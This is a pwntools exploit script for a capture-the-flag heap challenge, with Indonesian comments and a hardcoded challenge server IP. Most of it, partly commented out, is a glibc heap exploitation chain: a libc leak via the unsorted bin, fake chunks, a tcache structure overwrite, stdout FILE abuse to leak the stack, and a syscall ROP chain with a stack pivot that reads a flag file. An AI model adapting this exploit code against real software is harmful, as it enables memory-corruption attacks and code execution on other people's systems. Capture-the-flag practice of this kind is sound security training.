#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11104 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
host = args.HOST or '188.166.177.88'
port = int(args.PORT or 11103)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def create(size):
    io.sendlineafter('> ', '1')
    io.sendlineafter(':', str(size))

def edit(idx, ctx):
    io.sendlineafter('> ', '4')
    io.sendlineafter(':', str(idx))
    io.sendafter(':', ctx)

def view(idx):
    io.sendlineafter('> ', '3')
    io.sendlineafter(':', str(idx))

def copy(src,dst):
    io.sendlineafter('> ', '5')
    io.sendlineafter(':', str(src))
    io.sendlineafter(':', str(dst))

def delete(idx):
    io.sendlineafter('> ', '2')
    io.sendlineafter(':', str(idx))

def note(ctx):
    io.sendlineafter('> ', '6')
    io.sendlineafter(':', str(ctx))

def do_note(size):
    io.sendlineafter('> ', '75')
    io.sendlineafter(':', str(size))

# https://faraz.faith/2019-10-24-hitconctf-lazyhouse-balsn-exploit-analysis/
# libc = ELF("./libc-2.27.so")
libc = exe.libc

# x/20gx 0x55601fd07060
main_arena_96 = 0x1bebe0
main_arena = 0x1bebe0 - 96
libc_one_gadget = 0x4f432
call_realloc = 0x98d70+14

for i in range(7):
    create(0x100) # 0
    delete(0)

# # x/25gx 0x0000555555558060

create(0x10) # 0 0x0000555555559a10
create(0x10) # 1 0x0000555555559a30 nanti diubah size
create(0x3c0) # 2 0x0000555555559a50 nanti diubah size
create(0x200)  # 3 0x0000555555559e60

# merubah file size chunk no 1 yang nanti di free akan masuk ke unsorted bin
# p =''
# p += "a"*0x10
# p += 'a'*0x8 + p64(0x441)
# edit(2, p)
# copy(2, 0)

# # membuat fake chunk agar tidak "double free or corruption (!prev)" buat chunk 1 dan chunk 2
# p =''
# p += (p64(0)+p64(0x21))*27
# edit(3,p)

# # # index 1 menjadi 0x4c1 unsorted bin
# delete(1)

# create(0x3e0) # 1 0x481 - (0x420+0x10) = 0x90

# view(3)
# io.recv()
# leak = u64(io.recv(8))
# print hex(leak)
# libc.address = leak - main_arena_96
# print "Libc base:",hex(libc.address)

# malloc_hook = libc.sym['__malloc_hook']
# leave = libc.search(asm("leave ; ret")).next()
# environ = libc.sym['environ']

# pop_rdi = libc.address + 0x0000000000026796
# pop_rsi = libc.address + 0x000000000002890f
# pop_rdx = libc.address + 0x00000000000cb1cd
# pop_rax = libc.address + 0x000000000003ee88
# pop_rbp = libc.address + 0x00000000000253a6
# syscall_ret = next(libc.search(asm("syscall ; ret")))

# def syscall(rax, rdi, rsi, rdx):
#     chain = p64(pop_rax) + p64(rax)
#     chain += p64(pop_rdi) + p64(rdi)
#     chain += p64(pop_rsi) + p64(rsi)
#     chain += p64(pop_rdx) + p64(rdx)
#     chain += p64(syscall_ret)
#     return chain

# ##### membuat fake1 - fd dan bk tanpa size 
# create(0x20) # 4
# delete(4)

# view(3)
# io.recv()
# heap = u64(io.recv(16)[8:])-0x10
# print "Heap base:",hex(heap)

# create(0x10) # 4
# delete(4)

# ##### membuat small bin 0x110
# p =''
# p += "\x00"*0x10
# p += '\x00'*0x8 + p64(0x521)
# edit(1,p)

# # bikin unsorted bin = 0x5a0
# delete(2) 

# # pakai unsorted bin 0x440 , address unsorted bin pindah ke idx 
# create(0x400) # 2 0x560 - (0x420 + 0x20 +0x10) = 0x110

# create(0x3e0) # 4 unsorted bin -> small bin

# delete(4) # membuat size untuk fake1 , count size 0x3e0+0x10 tambah 1

# fake_1 = heap + 0x80

# p = ''
# # fake 2
# p += p64(0) + p64(0x31) 
# p += p64(fake_1) + p64(0)
# p += p64(0) + p64(0) 
# # real / small-bin
# p += p64(0) + p64(0x111)
# p += p64(libc.address+main_arena+96) + p64(fake_1)

# edit(3,p)

# create(0x100) # 4 junk
# create(0x100) # 5

# idx_stdout  = libc.sym["_IO_2_1_stdout_"]
# idx_stdin   = libc.sym["_IO_2_1_stdin_"]

# # ubah tcache_pertheread_struct di 0x110
# p = ''
# p += p64(0)*15
# p += p64(idx_stdout+16)
# edit(5,p)

# p = ''
# # p+= p64(0xfbad1800) # _flags
# # p+= p64(0) # _IO_read_ptr
# p+= p64(environ) # _IO_read_end
# p+= p64(0) # _IO_read_base
# p+= p64(environ) # _IO_write_base
# p+= p64(environ+8) # _IO_write_ptr
# note(p)

# io.recv()
# stack = u64(io.recv(8))
# print "stack:",hex(stack)

# size=0x100
# read=1
# to_heap = heap + 0xa50

# p=''
# if read:
#     # p += '/home/ezheap2/flag-91a3c725aef0bf4e7cd2996f029e070b.txt'.ljust(60,"\x00")
#     p += './flag.txt'.ljust(60,"\x00")
#     p += syscall(257, 0xffffffffffffff9c, to_heap, 0)
#     p += syscall(0, 3, to_heap+size+0x200, size)
#     p += syscall(1, 1, to_heap+size+0x200, size)
# else:
#     p += './'.ljust(60,"\x00")
#     p += syscall(257, 0xffffffffffffff9c, to_heap, 0)
#     p += syscall(78, 3, to_heap+size+0x200, size)
#     p += syscall(0, 3, to_heap+size+0x200, size)
#     p += syscall(1, 1, to_heap+size+0x200, size)
    
# edit(2,p)

# to_stack = stack-0x120 

# p = ''
# p += p64(0)*15
# p += p64(to_stack)
# edit(5,p)

# # # # # gdb.attach(io,"b *0x0000555555555992")

# #stack pivot
# p = ''
# p += p64(pop_rbp) 
# p += p64(heap + 0xa50 + 60 - 8)
# p += p64(leave)
# note(p)

io.interactive()

# x/25gx 0x0000555555558060
# x/25gx 0x0000555555559080

# x/100gx 0x0000555555559a00
# x/100gx 0x5555555598c0